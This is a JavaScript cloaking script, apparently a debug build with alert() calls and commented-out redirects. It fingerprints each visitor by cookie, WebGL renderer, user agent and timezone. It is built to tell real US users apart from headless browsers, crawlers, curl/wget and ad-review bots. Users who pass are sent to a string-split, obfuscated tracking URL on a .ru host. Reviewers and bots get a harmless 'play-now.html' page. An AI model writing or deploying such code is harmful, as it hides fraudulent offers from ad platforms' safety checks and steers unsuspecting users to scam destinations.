	var useragent=navigator.userAgent;
	var myuseragent1 = btoa(useragent);
	var myuseragent2 = Cookies.get('u');
	
	var ucookies = 0;
	if (myuseragent1==myuseragent2) {
		var ucookies = 1;
	}
	
	var canvas = document.createElement('canvas');
	var gl;
	var debugInfo;
	var vendor;
	var renderer;

	try {
	  gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
	} catch (e) {
	}

	if (gl) {
	  debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
	  vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
	  renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
	}

	console.log(renderer);
	renderer = renderer.toLowerCase();

	var myrenderer = 1;
	if (-1 < (pos = renderer.indexOf('swiftshader'))) {
		var myrenderer = 0;
	}
	if (-1 < (pos = renderer.indexOf('google'))) {
		var myrenderer = 0;
	}
	if (-1 < (pos = renderer.indexOf('OFFbasic'))) {
		var myrenderer = 0;
	}
	if (-1 < (pos = renderer.indexOf('OFFrender'))) {
		var myrenderer = 0;
	}	if (-1 < (pos = renderer.indexOf('OFFdriver'))) {
		var myrenderer = 0;
	}
	if (-1 < (pos = renderer.indexOf('shader'))) {
		var myrenderer = 0;
	}
	if (-1 < (pos = renderer.indexOf('swift'))) {
		var myrenderer = 0;
	}
	if (-1 < (pos = renderer.indexOf('OFFsource'))) {
		var myrenderer = 0;
	}	
	
	var myuseragent = 1;
	useragent = useragent.toLowerCase();
	if (-1 < (pos = useragent.indexOf('bot'))) {
		var myuseragent = 0;
	}
	if (-1 < (pos = useragent.indexOf('cros'))) {
		var myuseragent = 0;
	}
	if (-1 < (pos = useragent.indexOf('adwords'))) {
		var myuseragent = 0;
	}
	if (-1 < (pos = useragent.indexOf('spider'))) {
		var myuseragent = 0;
	}
	if (-1 < (pos = useragent.indexOf('curl'))) {
		var myuseragent = 0;
	}
	if (-1 < (pos = useragent.indexOf('wget'))) {
		var myuseragent = 0;
	}	
	
	var mytz = 0;
	let tz = new Date().getTimezoneOffset()/-60;
	const tzmin = -8;
	const tzmax = -4;
	alert(tz);
	if ((tz >= tzmin) && (tz <= tzmax)) {
		var mytz = 1;
	}
	
	alert(ucookies);
	alert(myrenderer);
	alert(renderer);
	alert(myuseragent);
	alert(mytz);
	
	if ((ucookies==1) && (myrenderer==1) && (myuseragent==1) && (mytz==1)) {
		var url = 'htt'+'p:/'+'/tr'+'ck.p'+'lsy'+'.ru/cl'+'ic'+'k?pi'+'d=2'+'6&o'+'ff'+'er_'+'id=1'+'3'+'7&s'+'ub'+'2=0'+'2'+'6G'+'&'+'s'+'ub'+'3='+utm_term;
		//window.location.href = url;
		alert(url);
	} else {
		var url = "play-now.html";
		//setTimeout( 'location="' + url + '";', 3000 );
		alert(url);
	};	
	
	Cookies.remove('u');